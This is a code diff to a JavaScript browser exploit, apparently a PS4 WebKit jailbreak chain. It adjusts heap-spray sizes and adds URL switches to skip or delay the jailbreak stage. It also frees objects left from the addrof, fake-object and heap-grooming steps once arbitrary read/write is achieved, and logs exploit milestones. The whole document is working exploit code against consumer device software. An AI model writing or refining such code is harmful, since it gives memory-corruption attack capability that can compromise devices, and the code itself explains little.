@@ -134,9 +134,15 @@ var DRAIN_COUNT = (function(){
 })();
 
 var CARRIER_SLOTS = (function(){
-    var v = parseInt(Q.get("c") || "2000000", 10);
-    if (!isFinite(v)) v = 2000000;
+    var v = parseInt(Q.get("c") || "800000", 10);
+    if (!isFinite(v)) v = 800000;
     return Math.max(100000, Math.min(4000000, v));
+})();
+var SKIP_JAILBREAK = Q.get("jb") === "0" || Q.get("l") === "1";
+var JB_DELAY_MS = (function(){
+    var v = parseInt(Q.get("jbdelay") || "2000", 10);
+    if (!isFinite(v)) v = 2000;
+    return Math.max(500, Math.min(10000, v));
 })();
 var CARRIER_BYTES = CARRIER_SLOTS * 8;
 
@@ -789,16 +795,19 @@ function reportComposition() {
         attemptSucceeded = true;
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
+        releasePreJailbreakMemory();
         if (!testRun) {
             testRun = true;
-            setTimeout(runJailbreak, 500);
+            if (SKIP_JAILBREAK) {
+                mark("JAILBREAK-SKIP", "jb=0-or-lite rw-only");
+            } else {
+                setTimeout(runJailbreak, JB_DELAY_MS);
+            }
         }
     }
 
     mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
-    setTimeout(function() { mark("SURVIVED-T100"); }, 100);
-    setTimeout(function() { mark("SURVIVED-T1000"); }, 1000);
-    setTimeout(function() { mark("SURVIVED-T3000"); }, 3000);
+    if (readPass && writePass) scheduleSurvivalMarks();
     if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
 }
 
@@ -888,6 +897,29 @@ function beginComposition() {
     }
     mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
     runGroomAndLoad();
+}
+
+// Drop SSV/addrof/groom garbage after RW is live (PS4 browser OOMs if kept through jailbreak).
+function releasePreJailbreakMemory() {
+    try { history.replaceState(null, ""); } catch (_) {}
+    fillerGraph = null;
+    outerGraph = null;
+    referenceTarget = null;
+    getterCarrier = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    leakedScope = null;
+    predecessorWords = null;
+    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
+    keepIndex = 0;
+    mark("MEM-RELEASE", "ssv-addrof-groom-dropped");
+}
+
+function scheduleSurvivalMarks() {
+    setTimeout(function() { mark("SURVIVED-T100"); }, 100);
+    setTimeout(function() { mark("SURVIVED-T1000"); }, 1000);
+    setTimeout(function() { mark("SURVIVED-T3000"); }, 3000);
 }
 
 // ========== R/W PRIMITIVES ==========
@@ -1116,7 +1148,7 @@ function runAttempt() {
 // ========== INIT ==========
 updateMeta();
 renderStages();
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS);
+mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (SKIP_JAILBREAK ? "0" : "1") + "-jbdelay=" + JB_DELAY_MS);
 try {
     runAttempt();
 } catch (error) {
